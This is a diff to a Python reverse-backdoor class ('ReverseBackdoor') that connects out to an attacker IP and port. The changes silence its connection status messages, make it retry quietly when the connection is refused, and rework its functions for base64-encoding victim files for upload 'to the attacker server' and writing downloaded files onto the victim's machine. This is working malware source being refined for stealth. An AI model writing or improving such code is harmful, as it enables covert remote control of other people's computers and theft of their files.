@@ -32,9 +32,10 @@ class ReverseBackdoor:
 			try:
 				self.connection.connect((self.ip,self.port))
 				connected = True
-				print('\r[*] Connection Established.')
+				# self.serial_send('\r[*] Connection Established.')
 			except ConnectionRefusedError:
-				print('\r[-] Connection Refused.', end='')
+				# print('\r[-] Connection Refused.', end='')
+				continue
 
 
 	def serial_send(self, data:str or list or bytes):
@@ -84,10 +85,13 @@ class ReverseBackdoor:
 		'''
 		upload file contents to the attacker server.
 		'''
-		with open(path, 'rb') as file:
-			file_content = file.read()
-			base64_file_content = base64.b64encode(file_content)
-			return base64_file_content
+		if os.path.isfile(path):
+			with open(path, 'rb') as file:
+				file_content = file.read()
+				base64_file_content = base64.b64encode(file_content)
+				return base64_file_content
+		else:
+			return f"[-] Exception : File {path} doesn't exist."
 
 
 	def write_file(self, path, content)->str:
@@ -95,13 +99,11 @@ class ReverseBackdoor:
 		write downloaded contents from the victim 
 		to the specified path file.
 		'''
-		if os.path.isfile(path):
-			with open(path, 'wb') as file:
-				bytes_content = base64.b64decode(content)
-				file.write(bytes_content)
-				return (f"[*] File {path} Downloaded successfully on Victim's machine.")
-		else:
-			return f"[-] Exception : File {path} doesn't exist."
+		with open(path, 'wb') as file:
+			bytes_content = base64.b64decode(content)
+			file.write(bytes_content)
+			return (f"[*] File {path} Downloaded successfully on Victim's machine.")
+	
 	
 	
 	def run(self):
